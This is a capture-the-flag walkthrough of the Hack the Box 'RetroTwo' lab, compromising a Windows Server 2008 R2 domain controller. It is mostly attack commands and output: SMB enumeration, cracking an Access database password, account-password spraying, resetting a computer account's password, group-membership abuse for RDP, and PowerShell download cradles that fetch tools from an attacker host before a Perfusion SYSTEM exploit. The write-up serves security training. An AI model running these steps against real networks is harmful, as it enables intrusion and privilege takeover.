---
source: Hack the Box
title: RetroTwo
difficulty: easy
tags: Microsoft Access, Password Cracking, Active Directory, Perfusion
summary: **RetroTwo**: A password protected database can be cracked and dumped to reveal credentials. Using the found credentials the attacker can
collect Bloodhound data and find Pre-Windows 2000 computer accounts. One of these accounts has access to the `Services` group which is a member
of the `Remote Desktop Users` group. Exploiting this permission chain allows the user from the database to access RDP. Once on the victim machine,
an outdated OS is exploited with `Perfusion` via RpcEptMapper. 
---

## [01] Port Scan and Service Discovery

```term
$ nmap -sC -sV -vv -oN scans/nmap_top1000.txt 10.129.63.198
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15F75) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15F75)
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-08-15 17:27:44Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds  syn-ack ttl 127 Windows Server 2008 R2 Datacenter 7601 Service Pack 1 microsoft-ds (workgroup: RETRO2)
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Service
| ssl-cert: Subject: commonName=BLN01.retro2.vl
| Issuer: commonName=BLN01.retro2.vl
| rdp-ntlm-info:
|   Target_Name: RETRO2
|   NetBIOS_Domain_Name: RETRO2
|   NetBIOS_Computer_Name: BLN01
|   DNS_Domain_Name: retro2.vl
|   DNS_Computer_Name: BLN01.retro2.vl
|   Product_Version: 6.1.7601
|_  System_Time: 2026-08-15T17:28:38+00:00
49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49163/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: BLN01; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   2.1:
|_    Message signing enabled and required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery:
|   OS: Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (Windows Server 2008 R2 Datacenter 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: BLN01
|   NetBIOS computer name: BLN01\x00
|   Domain name: retro2.vl
|   Forest name: retro2.vl
|   FQDN: BLN01.retro2.vl
|_  System time: 2026-08-15T19:28:43+02:00
|_clock-skew: mean: -6h57m59s, deviation: 53m37s, median: -6h34m01s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 4792/tcp): CLEAN (Timeout)
|   Check 2 (port 65167/tcp): CLEAN (Timeout)
|   Check 3 (port 53286/udp): CLEAN (Timeout)
|   Check 4 (port 38960/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
|   date: 2026-08-15T17:28:39
|_  start_date: 2026-08-15T17:23:52
```

## [02] Enumerating SMB and finding Credentials

```term
$ nxc smb retro2.vl -u 'Guest' -p '' -M spider_plus                 
SMB         10.129.63.198   445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.63.198   445    BLN01            [+] retro2.vl\Guest: 
SPIDER_PLUS 10.129.63.198   445    BLN01            [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.63.198   445    BLN01            [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.63.198   445    BLN01            [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.63.198   445    BLN01            [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.63.198   445    BLN01            [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.63.198   445    BLN01            [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.63.198   445    BLN01            [*]  OUTPUT_FOLDER: /home/grehaus/.nxc/modules/nxc_spider_plus
SMB         10.129.63.198   445    BLN01            [*] Enumerated shares
!!SMB         10.129.63.198   445    BLN01            Share           Permissions            Remark
!!SMB         10.129.63.198   445    BLN01            -----           -----------            ------
!!SMB         10.129.63.198   445    BLN01            ADMIN$                                 Remote Admin
!!SMB         10.129.63.198   445    BLN01            C$                                     Default share
!!SMB         10.129.63.198   445    BLN01            IPC$                                   Remote IPC
!!SMB         10.129.63.198   445    BLN01            NETLOGON                               Logon server share 
!!SMB         10.129.63.198   445    BLN01            Public          READ                   
!!SMB         10.129.63.198   445    BLN01            SYSVOL                                 Logon server share 
SPIDER_PLUS 10.129.63.198   445    BLN01            [+] Saved share-file metadata to "/home/grehaus/.nxc/modules/nxc_spider_plus/10.129.63.198.json".
SPIDER_PLUS 10.129.63.198   445    BLN01            [*] SMB Shares:           6 (ADMIN$, C$, IPC$, NETLOGON, Public, SYSVOL)
SPIDER_PLUS 10.129.63.198   445    BLN01            [*] SMB Readable Shares:  1 (Public)
SPIDER_PLUS 10.129.63.198   445    BLN01            [*] Total folders found:  2
SPIDER_PLUS 10.129.63.198   445    BLN01            [*] Total files found:    1
SPIDER_PLUS 10.129.63.198   445    BLN01            [*] File size average:    856 KB
SPIDER_PLUS 10.129.63.198   445    BLN01            [*] File size min:        856 KB
SPIDER_PLUS 10.129.63.198   445    BLN01            [*] File size max:        856 KB
```
```term
$ cat /home/grehaus/.nxc/modules/nxc_spider_plus/10.129.63.198.json | jq        
{
  "Public": {
!!    "DB/staff.accdb": {
      "atime_epoch": "2024-08-17 07:07:06",
      "ctime_epoch": "2024-08-17 07:06:49",
      "mtime_epoch": "2024-08-17 09:30:34",
      "size": "856 KB"
    }
  }
}
```

We have one file in the public share, `DB/staff.accdb`, let's grab it and inspect it.

```term
$ smbclient //10.129.63.198/Public -U 'Guest'
smb: \> get DB\staff.accdb
getting file \DB\staff.accdb of size 876544 as DB\staff.accdb (1591.1 KiloBytes/sec) (average 1591.1 KiloBytes/sec)
```

```term
$ file staff.accdb
DB\staff.accdb: Microsoft Access Database
```

We can use accdbpy.py to inspect the database.

```term
$ python3 /opt/accdbpy.py tables 'DB\staff.accdb'
!![-] This database is password-protected. Use -p to provide the password.
```

The database is password protected, we can attempt to crack it with `john`. 

```term
$ office2john 'DB\staff.accdb'| tee staff.hash
!!DB\staff.accdb:$office$*2013*100000*256*16*5736cfcbb054e749a8f303570c5c1970*1ec683f4d8c4e9faf77d3c01f2433e56*7de0d4af8c54c33be322dbc860b68b4849f811196015a3f48a424a265d018235
```
```term
$ john --wordlist=/usr/share/wordlists/rockyou.txt staff.hash
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 512/512 AVX512BW 16x / SHA512 512/512 AVX512BW 8x AES])
!!xxxxxxxx          (DB\staff.accdb)
Session completed.
```

Now that we have a password, we should be able to inspect the database.

```term
$ python3 /opt/accdbpy.py vba 'DB\staff.accdb' -p xxxxxxxx
[!] Interesting strings (27 found):

    ADODB.Connection$
    Password
    Encrypt Password
    ADODB.Command
    LDAP://OU=staff,DC=retro2,DC=vl
!!    retro2\ldapreader
!!    xxxxxxxx 
    ("ADODB.
    0#0#C:\W
    indows\S
    A4AC9E1D
    iles\Com
    ared\OFF
    ICE16\AC
    Module1b
    strPasswordaq
    CreateObject
    ID="{E2D64610-6C13-41A0-B361-0762ECCD8A6C}"
    CMG="0A08CD536D576D576D576D57"
    DPB="A6A461F7610FFC10FC10FC"
    GC="4240859B209C209CDF"
    &H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000
    C:\Program Files\Common Files\Microsoft Shared\VBA\VBA7.1\VBE7.DLL
    C:\Program Files\Microsoft Office\root\Office16\MSACC.OLB
    C:\Windows\System32\stdole2.tlb
    C:\Program Files\Common Files\Microsoft Shared\OFFICE16\ACEDAO.DLL
    ImportStaffUsersFromLDAP
```

Extracting strings from the database shows a potential user and password. We can confirm this with `nxc`.

```term
$ nxc ldap retro2.vl -u 'ldapreader' -p 'xxxxxxxx'                                                                                                                                                                                                                                    
LDAP 10.129.63.198 389 BLN01 [*] Windows 7 / Server 2008 R2 Build 7601 (name:BLN01) (domain:retro2.vl) (signing:None) (channel binding:No TLS cert)                                                                                                               
!!LDAP 10.129.63.198 389 BLN01 [+] retro2.vl\ldapreader:xxxxxxxx
```
## [03] Finding Computer Accounts in Bloodhound

With this being a domain joined machine, we can use `bloodhound` to enumerate further.

```term
$ bloodhound-python -u 'ldapreader' -p 'xxxxxxxx' -d 'retro2.vl' -c all -ns 10.129.63.198
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: retro2.vl
INFO: Getting TGT for user
INFO: Connecting to LDAP server: bln01.retro2.vl
INFO: Testing resolved hostname connectivity dead:beef::bdf6:cca1:1678:24c2
INFO: Trying LDAP connection to dead:beef::bdf6:cca1:1678:24c2
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 4 computers
INFO: Connecting to LDAP server: bln01.retro2.vl
INFO: Testing resolved hostname connectivity dead:beef::bdf6:cca1:1678:24c2
INFO: Trying LDAP connection to dead:beef::bdf6:cca1:1678:24c2
INFO: Found 27 users
INFO: Found 43 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer:
INFO: Querying computer: BLN01.retro2.vl
INFO: Done in 00M 15S
```

We can find a group `Domain Computers` that has a few computer accounts. They all have the ability to reset each others passwords, however, one stands out.
`ADMWS01` can add members to the `Services` group, which is a member of `Remote Desktop Users`. We can test for Pre-Windows 2000 capabilities which would then allow
us to reset the password of the `ADMWS01` computer. With that, we can use the `ADMWS01` account to add the `ldapreader` user into the `Services` group allowing us remote access.

## [04] Abusing Permissions for RDP Access

We can start by creating a list of the computer accounts and their Pre-2k passwords and attempt to authenticate.

```term
$ nxc smb retro2.vl -u computers.txt -p computer_pass.txt -k --continue-on-success
SMB         retro2.vl       445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True) (Null Auth:True)
!!SMB         retro2.vl       445    BLN01            [+] retro2.vl\FS01$:fs01
SMB         retro2.vl       445    BLN01            [-] retro2.vl\FS02$:fs01 KDC_ERR_PREAUTH_FAILED
SMB         retro2.vl       445    BLN01            [-] retro2.vl\AMDWS01$:fs01 KDC_ERR_C_PRINCIPAL_UNKNOWN
!!SMB         retro2.vl       445    BLN01            [+] retro2.vl\FS02$:fs02
SMB         retro2.vl       445    BLN01            [-] retro2.vl\AMDWS01$:fs02 KDC_ERR_C_PRINCIPAL_UNKNOWN
SMB         retro2.vl       445    BLN01            [-] retro2.vl\AMDWS01$:admws01 KDC_ERR_C_PRINCIPAL_UNKNOWN
```

And we get some hits. Let's now use those credentials to reset the password of the `ADMWS01` account. First let's grab a ticket.

```term
$ nxc smb retro2.vl -u 'FS01$' -p 'fs01' -k --generate-tgt FS01
SMB         retro2.vl       445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         retro2.vl       445    BLN01            [+] retro2.vl\FS01$:fs01
SMB         retro2.vl       445    BLN01            [+] TGT saved to: FS01.ccache
SMB         retro2.vl       445    BLN01            [+] Run the following command to use the TGT: export KRB5CCNAME=FS01.ccache
```

Now reset the password.

```term
$ export KRB5CCNAME=FS01.ccache; impacket-addcomputer -computer-name 'ADMWS01$' -computer-pass 'Changeme1!' -no-add -k -no-pass -dc-host BLN01.retro2.vl 'retro2.vl/FS01$'

!![*] Successfully set password of ADMWS01$ to Changeme1!.
```

Now add our user to the `Services` group giving us access via RDP.

```term
$ bloodyad --host BLN01.retro2.vl -d retro2.vl -u 'ADMWS01$' -p 'Changeme1!' add groupMember Services ldapreader
!![+] ldapreader added to Services
```

## [05] RDP as "ldapuser" and Privilege Escalation

Now that we are on the box, we saw earlier that this is a rather old OS Windows 2008. Let's check `systeminfo` and take a better look.

```term
$ PS C:\Users\ldapreader> systeminfo

Host Name:                 BLN01
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter
!!OS Version:                6.1.7601 Service Pack 1 Build 7601
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Primary Domain Controller
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                55041-402-3582622-84981
Original Install Date:     8/17/2024, 10:41:46 AM
System Boot Time:          8/15/2026, 7:23:14 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+01:00) Amsterdam, Berlin, Bern, Rome, Stockholm, Vienna
Total Physical Memory:     4,095 MB
Available Physical Memory: 3,310 MB
Virtual Memory: Max Size:  8,189 MB
Virtual Memory: Available: 7,347 MB
Virtual Memory: In Use:    842 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    retro2.vl
Logon Server:              \\BLN01
!!Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 5
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.10.2
                                 IP address(es)
                                 [01]: 10.129.63.198
                                 [02]: fe80::bdf6:cca1:1678:24c2
                                 [03]: dead:beef::bdf6:cca1:1678:24c2
```

We can see a `Windows Server 2008 R2` with no hotfixes. Let's download and execute the `PrivescCheck.ps1` script.

```term
$ PS C:\Users\ldapreader\Desktop> (New-Object Net.WebClient).DownloadFile("http://10.10.15.236:9000/PrivescCheck.ps1","C:\Users\Public\check.ps1")
```
```term
$ PS C:\Users\Public> powershell -ep bypass -c ". .\check.ps1; Invoke-PrivescCheck"
---snip---
Name              : RpcEptMapper
ImagePath         : C:\Windows\system32\svchost.exe -k RPCSS
User              : NT AUTHORITY\NetworkService
ModifiablePath    : {Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RpcEptMap
                    per}
IdentityReference : NT AUTHORITY\Authenticated Users
Permissions       : {ReadControl, AppendData/AddSubdirectory, ReadData/ListDirectory}
Status            : Running
UserCanStart      : True
UserCanRestart    : False

Name              : RpcEptMapper
ImagePath         : C:\Windows\system32\svchost.exe -k RPCSS
User              : NT AUTHORITY\NetworkService
ModifiablePath    : {Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RpcEptMap
                    per}
IdentityReference : BUILTIN\Users
Permissions       : {WriteExtendedAttributes, AppendData/AddSubdirectory, ReadData/ListDirectory}
Status            : Running
UserCanStart      : True
UserCanRestart    : False
---snip---
```

We can see it flags the `RpcEptMapper`. Doing some research I found an article here `https://itm4n.github.io/windows-registry-rpceptmapper-exploit/`
Following along with the guide, I had to download Visual Studio as well as some additional installations to be able to compile the executable.
Once I had the executable compiled, I transferred it to my VM and then fetched it from the victim machine.

```term
$ PS C:\Users\ldapreader\Desktop> (New-Object Net.WebClient).DownloadFile("http://10.10.15.236:9000/Perfusion.exe","C:\Users\ldapreader\Desktop\Perfusion.exe")
PS C:\Users\ldapreader\Desktop> dir


    Directory: C:\Users\ldapreader\Desktop


Mode                LastWriteTime     Length Name
----                -------------     ------ ----
!!-a---         8/16/2026  12:32 PM      34816 Perfusion.exe
```

Run the exploit and loot it.

```term
$ PS C:\Users\ldapreader\Desktop> .\Perfusion.exe -h
[-] Missing command line argument: -c
 _____         ___         _
|  _  |___ ___|  _|_ _ ___|_|___ ___
|   __| -_|  _|  _| | |_ -| | . |   |  version 0.2
|__|  |___|_| |_| |___|___|_|___|_|_|  by @itm4n

Description:
  Exploit tool for the RpcEptMapper registry key vulnerability.

Options:
  -c <CMD>  Command - Execute the specified command line
  -i        Interactive - Interact with the process (default: non-interactive)
  -d        Desktop - Spawn a new process on your desktop (default: hidden)
  -k <KEY>  Key - Either 'RpcEptMapper' or 'Dnscache' (default: 'RpcEptMapper')
  -h        Help - That's me :)

!!PS C:\Users\ldapreader\Desktop> .\Perfusion.exe -c cmd -i
[*] Created Performance DLL: C:\Users\LDAPRE~1\AppData\Local\Temp\2\performance_3932_4908_2.dll
[*] Created Performance registry key.
[*] Triggered Performance data collection.
[+] Exploit completed. Got a SYSTEM token! :)
[*] Waiting for the Trigger Thread to terminate... OK
[!] Failed to delete Performance registry key.
[*] Deleted Performance DLL.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\ldapreader\Desktop>whoami
!!nt authority\system
```
